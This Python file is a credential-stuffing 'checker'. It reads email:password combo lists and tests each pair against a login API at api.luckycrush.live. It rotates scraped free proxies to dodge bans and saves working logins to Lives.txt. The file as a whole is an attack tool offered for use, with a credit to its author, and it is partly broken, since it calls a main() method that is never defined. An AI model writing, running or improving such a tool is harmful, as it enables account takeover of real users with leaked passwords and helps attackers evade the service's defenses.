
import requests
import multiprocessing
from multiprocessing.dummy import Pool
from random import choice
from colorama import Fore
import time

lock = multiprocessing.Lock()
    
# GLOBAL
proxylist = []
TOTAL_CHECKED = 0

class output():
    def display(self, email, password, proxy,port,case):
        elapsed_time = time.time() - start_time
        current_time = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))

        if case == True:
            print(Fore.GREEN+"[{}:{}:{}] Loggin Success: {}:{} ".format(TOTAL_CHECKED,len(proxylist),current_time,email,password)+Fore.CYAN+"{}:{}".format(proxy,port))
            lives = open("Lives.txt","a")
            print(f"""
            Combo: {email}:{password}
            Proxy: {proxy}{port}
            Email: {email}
            Password: {password}
            Checker by MarcusHolloway7
            <-><-><-><-><-><-><-><->
            """,file = lives)
            # lives.close()
        elif case == False:
            lives = open("Dead.txt","a")
            print(Fore.RED+"[{}:{}:{}] Login Falied: {}:{} ".format(TOTAL_CHECKED,len(proxylist),current_time,email,password)+Fore.CYAN+"{}:{}".format(proxy,port))
            print(f"{email}:{password}",file = lives)
        elif case == None:
            with open("unknown.txt","a") as unknown:
                print(Fore.RED+"[{}:{}:{}] Login Falied: {}:{} ".format(TOTAL_CHECKED,len(proxylist),current_time,email,password)+Fore.CYAN+"{}:{}".format(proxy,port))
                print(f"{email}:{password}",file = unknown)

class post():
    def proxyscrape(self):
        global proxylist
        # global TOTAL_CHECKED
        try:
            url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all"
            source = requests.get(url).text
            source = source.replace("\r","").split("\n")
        except KeyboardInterrupt:
            exit()
        for proxy in source:
            if(proxy!=""):
                proxylist.append(proxy)
        # lock.acquire()

        with lock:
            proxylist = list(dict.fromkeys(proxylist))
            # print("Scraped Proxies: {}\n".format(len(proxylist)))
            
            # lock.release()

    def send_proxies(self): 
        if(len(proxylist)>0):
            return {"https:":choice(proxylist)}
        else:
            self.proxyscrape()
            return {"https:":choice(proxylist)}

    def token(self):
        pass

    def capture(self):
        pass

    def request(self, email, password):
        global TOTAL_CHECKED
        param = {"email":email,"password":password}
        self.api = requests.session()
        while True:

            try:
                while True:
                    try:
                        proxy = self.send_proxies()
                        cleaned_proxy = str(proxy.get("https:")).split(":")[0]
                        cleaned_port = str(proxy.get("https:")).split(":")[1]
                        # api2 = requests.session()
                        proxy_build = "http://{}:{}".format(cleaned_proxy,cleaned_port)
                        proxies = {
                        'http': proxy_build,
                        'https': proxy_build,
                        }
                        source2 = self.api.post("https://azenv.net",timeout=7, proxies=proxies)
                        # print(source2.text)
                        if "REMOTE_ADDR = {}".format(cleaned_proxy) in source2.text:
                            # print(source2.text)
                            break
                    except:
                        if ((proxy["https:"]== each) for each in proxylist):
                            try:
                                with lock:
                                    proxylist.remove(proxy["https:"])
                                # lock.release()
                            except:
                                pass

                source = self.api.post("https://api.luckycrush.live/buurn/public/login",data=param,timeout=7,proxies=proxy)
                break

            except KeyboardInterrupt:
                exit()
            except:
                if ((proxy["https:"]== each) for each in proxylist):
                    try:
                        with lock:
                            proxylist.remove(proxy["https:"])
                    except:
                        pass
            with lock:
                print(Fore.YELLOW+"""[x] Banned Proxy:"""+Fore.WHITE+" {}".format(proxy["https:"]))
            lock.release()

        if source.text == """{"valid":true}""":
            with lock:
                TOTAL_CHECKED += 1
                output().display(email,password,cleaned_proxy,cleaned_port,case=True)
                # lock.release()
        elif source.text == """{"valid":false}""":
            with lock:
                TOTAL_CHECKED += 1
                output().display(email,password,cleaned_proxy,cleaned_port,case=False)
                # lock.release()
        else:
            # lock.acquire()
            with lock:
                TOTAL_CHECKED += 1
                output().display(email,password,cleaned_proxy,cleaned_port,case=None)
                # lock.release()



class checker():

    def __init__(self):
        self.acc_array = []

    def load(self, combo):
        file = open(combo, "r").readlines()
        file = [combos.rstrip()for combos in file]
        for lines in file:
            data = lines.split(":")
            try:
                self.acc_array.append({"email":data[0],
                                        "password":data[1]})
            except:
                pass

    def sender(self, account):
        email = account["email"]
        password = account["password"]
        while True:
            try:
                post().request(email,password)
                break
            except ConnectionError:
                print("Conncetion Error!")


if __name__ == "__main__":
    start_time = time.time()
    checker().main()
